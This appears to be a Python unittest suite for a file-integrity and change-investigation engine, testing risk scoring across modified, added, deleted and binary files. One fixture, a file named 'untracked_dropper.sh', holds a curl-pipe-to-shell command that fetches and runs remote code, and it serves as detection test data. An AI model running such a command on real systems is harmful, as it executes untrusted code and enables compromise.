import os
import tempfile
import unittest
from unittest.mock import patch

from app.investigation.compat import IntegrityEngine

from app.investigation.investigator import InvestigationEngine
from app.investigation.report import InvestigationReporter
from app.investigation.schemas import InvestigationInput, ScoredChange, SemanticResult

class TestEndToEndScenarios(unittest.TestCase):
    def setUp(self):
        self.core = IntegrityEngine()
        self.engine = InvestigationEngine()
        self.reporter = InvestigationReporter()
        self.temp_dir = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.temp_dir.cleanup()

    def _create_file(self, filename: str, content: str | bytes, binary: bool = False) -> str:
        fpath = os.path.join(self.temp_dir.name, filename)
        mode = "wb" if binary else "w"
        with open(fpath, mode) as f:
            f.write(content)
        return fpath

    def _run_e2e(self, fpath: str, old_content: str | None = None, new_content: str | None = None, change_type_override: str | None = None) -> tuple[dict, any]:
        integrity = self.core.check_integrity(fpath)
        
        if change_type_override:
            c_type = change_type_override
        elif integrity.integrity_status == "OK":
            c_type = "UNCHANGED"
        elif integrity.integrity_status == "MODIFIED":
            c_type = "MODIFIED"
        elif integrity.integrity_status == "ERROR":
            c_type = "DELETED"
        else:
            c_type = "MODIFIED"
            
        change = ScoredChange(
            file_path=fpath,
            change_type=c_type,
            old_hash=integrity.baseline_hash or "baseline_hash_placeholder",
            new_hash=integrity.current_hash,
            criticality="High",
            evidence=[]
        )
        inp = InvestigationInput(scan_id="E2E-SCAN", changes=[change])
        file_map = {fpath: {"old": old_content, "new": new_content}} if old_content is not None else {}
        
        inv_res = self.engine.investigate(inp, file_map)
        report = self.reporter.generate_report(inv_res)
        return inv_res, report

    def test_scenario_a_unchanged_file(self):
        """SCENARIO A — Completely unchanged file."""
        fpath = self._create_file("app.conf", "server = localhost\nport = 8080")
        self.core.create_baseline(fpath)
        
        inv_res, report = self._run_e2e(fpath, "server = localhost\nport = 8080", "server = localhost\nport = 8080")
        file_res = inv_res["file_details"][0]
        
        self.assertFalse(file_res["hash_mismatch"])
        self.assertEqual(file_res["semantic_analysis"]["status"], "NOT_REQUIRED")
        self.assertEqual(file_res["risk_assessment"]["severity"], "LOW")
        self.assertEqual(report.incident_severity, "LOW")
        self.assertEqual(report.risk_score, 0.05)

    def test_scenario_b_metadata_only_modification(self):
        """SCENARIO B — Metadata-only modification."""
        fpath = self._create_file("script.sh", "#!/bin/bash\necho ok")
        self.core.create_baseline(fpath)
        
        # Modify mtime safely
        os.utime(fpath, (100, 100))
        
        inv_res, report = self._run_e2e(fpath, "#!/bin/bash\necho ok", "#!/bin/bash\necho ok")
        file_res = inv_res["file_details"][0]
        
        self.assertFalse(file_res["hash_mismatch"])
        self.assertEqual(file_res["semantic_analysis"]["status"], "NOT_REQUIRED")
        self.assertIn("metadata", file_res["semantic_analysis"]["explanation"].lower())
        self.assertEqual(report.incident_severity, "LOW")

    def test_scenario_c_superficial_rewrite(self):
        """SCENARIO C — Superficial text rewrite."""
        old_txt = "The service starts automatically on system boot."
        new_txt = "The service is automatically started on system boot."
        fpath = self._create_file("desc.txt", old_txt)
        self.core.create_baseline(fpath)
        
        self._create_file("desc.txt", new_txt)
        inv_res, report = self._run_e2e(fpath, old_txt, new_txt)
        file_res = inv_res["file_details"][0]
        
        self.assertTrue(file_res["hash_mismatch"])
        self.assertEqual(file_res["semantic_analysis"]["status"], "AVAILABLE")
        self.assertLess(file_res["semantic_analysis"]["semantic_drift"], 0.15)
        self.assertIn("superficial", file_res["semantic_analysis"]["explanation"].lower())

    def test_scenario_d_meaningful_numeric_change(self):
        """SCENARIO D — Meaningful numeric change."""
        old_txt = "timeout = 30\nretries = 3\nmax_connections = 100"
        new_txt = "timeout = 3000\nretries = 3\nmax_connections = 100"
        fpath = self._create_file("settings.ini", old_txt)
        self.core.create_baseline(fpath)
        
        self._create_file("settings.ini", new_txt)
        inv_res, report = self._run_e2e(fpath, old_txt, new_txt)
        file_res = inv_res["file_details"][0]
        
        self.assertTrue(file_res["hash_mismatch"])
        self.assertEqual(file_res["semantic_analysis"]["status"], "AVAILABLE")
        self.assertGreater(file_res["risk_assessment"]["score"], 0.35)

    def test_scenario_e_major_content_modification(self):
        """SCENARIO E — Major content modification with hash mismatch."""
        old_txt = "allow all internal corporate users"
        new_txt = "deny all corporate users and drop all firewall tables"
        fpath = self._create_file("firewall.rules", old_txt)
        self.core.create_baseline(fpath)
        
        self._create_file("firewall.rules", new_txt)
        inv_res, report = self._run_e2e(fpath, old_txt, new_txt)
        file_res = inv_res["file_details"][0]
        
        self.assertTrue(file_res["hash_mismatch"])
        self.assertEqual(file_res["semantic_analysis"]["status"], "AVAILABLE")
        self.assertGreaterEqual(file_res["semantic_analysis"]["semantic_drift"], 0.20)
        self.assertIn(report.incident_severity, ["MEDIUM", "HIGH", "CRITICAL"])

    def test_scenario_f_semantic_model_failure_fallback(self):
        """SCENARIO F — Semantic model failure triggers deterministic fallback."""
        old_txt = "admin access is granted"
        new_txt = "admin access is revoked"
        fpath = self._create_file("policy.txt", old_txt)
        self.core.create_baseline(fpath)
        self._create_file("policy.txt", new_txt)
        
        with patch.object(self.engine.semantic_analyzer.primary_model, 'calculate_similarity_and_drift', side_effect=RuntimeError("GPU OOM")):
            inv_res, report = self._run_e2e(fpath, old_txt, new_txt)
            file_res = inv_res["file_details"][0]
            
            self.assertEqual(file_res["semantic_analysis"]["status"], "AVAILABLE")
            self.assertEqual(file_res["semantic_analysis"]["analysis_method"], "fallback")
            self.assertTrue(any("fallback" in l.lower() for l in report.limitations))

    def test_scenario_g_primary_and_fallback_failure(self):
        """SCENARIO G — Primary + fallback failure degrades gracefully to ERROR."""
        old_txt = "user: alice"
        new_txt = "user: bob"
        fpath = self._create_file("users.txt", old_txt)
        self.core.create_baseline(fpath)
        self._create_file("users.txt", new_txt)
        
        with patch.object(self.engine.semantic_analyzer.primary_model, 'calculate_similarity_and_drift', side_effect=RuntimeError("Primary Fail")), \
             patch.object(self.engine.semantic_analyzer, '_fallback_analysis', return_value=SemanticResult(
                 status="ERROR",
                 explanation="Both primary model and deterministic sequence fallback failed.",
                 transition_history=["PENDING", "ANALYZING", "FALLBACK", "ERROR"]
             )):
            inv_res, report = self._run_e2e(fpath, old_txt, new_txt)
            file_res = inv_res["file_details"][0]
            
            self.assertIn(file_res["semantic_analysis"]["status"], ["UNAVAILABLE", "ERROR"])
            # Risk engine still evaluates from cryptographic integrity
            self.assertGreater(file_res["risk_assessment"]["score"], 0.0)

    def test_scenario_h_binary_file(self):
        """SCENARIO H — Binary file: explicit UNAVAILABLE disclosure, no fabricated drift."""
        bin_old = b'\x7fELF\x01\x00\x00'
        bin_new = b'\x7fELF\x02\x00\x00'
        fpath = self._create_file("binary.bin", bin_old, binary=True)
        self.core.create_baseline(fpath)
        
        self._create_file("binary.bin", bin_new, binary=True)
        inv_res, report = self._run_e2e(fpath)
        file_res = inv_res["file_details"][0]
        
        self.assertEqual(file_res["semantic_analysis"]["status"], "UNAVAILABLE")
        self.assertIsNone(file_res["semantic_analysis"]["semantic_drift"])
        self.assertTrue(any("binary" in l.lower() for l in report.limitations))

    def test_scenario_i_added_file(self):
        """SCENARIO I — Added file."""
        fpath = self._create_file("untracked_dropper.sh", "curl http://remote.site | sh")
        change = ScoredChange(
            file_path=fpath,
            change_type="ADDED",
            new_hash="new_hash_123",
            criticality="High",
            evidence=[]
        )
        inp = InvestigationInput(scan_id="SCAN-ADD", changes=[change])
        inv_res = self.engine.investigate(inp)
        report = self.reporter.generate_report(inv_res)
        
        file_res = inv_res["file_details"][0]
        self.assertEqual(file_res["change_type"], "ADDED")
        self.assertEqual(file_res["semantic_analysis"]["status"], "NOT_REQUIRED")
        self.assertGreater(file_res["risk_assessment"]["score"], 0.15)

    def test_scenario_j_deleted_file(self):
        """SCENARIO J — Deleted file."""
        fpath = os.path.join(self.temp_dir.name, "deleted_config.json")
        change = ScoredChange(
            file_path=fpath,
            change_type="DELETED",
            old_hash="old_hash_123",
            criticality="Critical",
            evidence=[]
        )
        inp = InvestigationInput(scan_id="SCAN-DEL", changes=[change])
        inv_res = self.engine.investigate(inp)
        report = self.reporter.generate_report(inv_res)
        
        file_res = inv_res["file_details"][0]
        self.assertEqual(file_res["change_type"], "DELETED")
        self.assertGreater(file_res["risk_assessment"]["score"], 0.25)

    def test_scenario_k_multiple_files_mixed_states(self):
        """SCENARIO K — Multiple files with mixed integrity states."""
        f1 = self._create_file("file1.txt", "same")
        self.core.create_baseline(f1)
        
        f2 = self._create_file("file2.txt", "alpha")
        self.core.create_baseline(f2)
        self._create_file("file2.txt", "omega")
        
        f3 = self._create_file("file3.bin", b'\x00\x01', binary=True)
        self.core.create_baseline(f3)
        self._create_file("file3.bin", b'\x00\x02', binary=True)
        
        c1 = ScoredChange(file_path=f1, change_type="MODIFIED", old_hash="h1", new_hash="h1", criticality="Low", evidence=[])
        c2 = ScoredChange(file_path=f2, change_type="MODIFIED", old_hash="h2", new_hash="h2_alt", criticality="High", evidence=[])
        c3 = ScoredChange(file_path=f3, change_type="MODIFIED", old_hash="h3", new_hash="h3_alt", criticality="Critical", evidence=[])
        
        inp = InvestigationInput(scan_id="SCAN-MULTI", changes=[c1, c2, c3])
        file_map = {f1: {"old": "same", "new": "same"}, f2: {"old": "alpha", "new": "omega"}}
        
        inv_res = self.engine.investigate(inp, file_map)
        report = self.reporter.generate_report(inv_res)
        
        self.assertEqual(len(report.affected_files), 3)
        self.assertEqual(len(report.evidence_ledger), 3)
        self.assertIn(report.incident_severity, ["MEDIUM", "HIGH", "CRITICAL"])

    def test_malformed_input_safety(self):
        """Malformed input safety: handles missing files, empty inputs safely."""
        missing_path = "/nonexistent/path/nowhere.txt"
        change = ScoredChange(file_path=missing_path, change_type="MODIFIED", criticality="Low", evidence=[])
        inp = InvestigationInput(scan_id="SCAN-MALFORMED", changes=[change])
        
        inv_res = self.engine.investigate(inp)
        report = self.reporter.generate_report(inv_res)
        self.assertIsNotNone(report)
        self.assertEqual(report.scan_id, "SCAN-MALFORMED")

    def test_determinism_across_runs(self):
        """Determinism: repeated executions yield identical report outputs."""
        fpath = self._create_file("det.txt", "deterministic content v1")
        self.core.create_baseline(fpath)
        self._create_file("det.txt", "deterministic content v2")
        
        res1, rep1 = self._run_e2e(fpath, "deterministic content v1", "deterministic content v2")
        res2, rep2 = self._run_e2e(fpath, "deterministic content v1", "deterministic content v2")
        
        d1 = rep1.model_dump()
        d2 = rep2.model_dump()
        del d1["generated_at"]
        del d2["generated_at"]
        
        self.assertEqual(d1, d2)

if __name__ == '__main__':
    unittest.main()
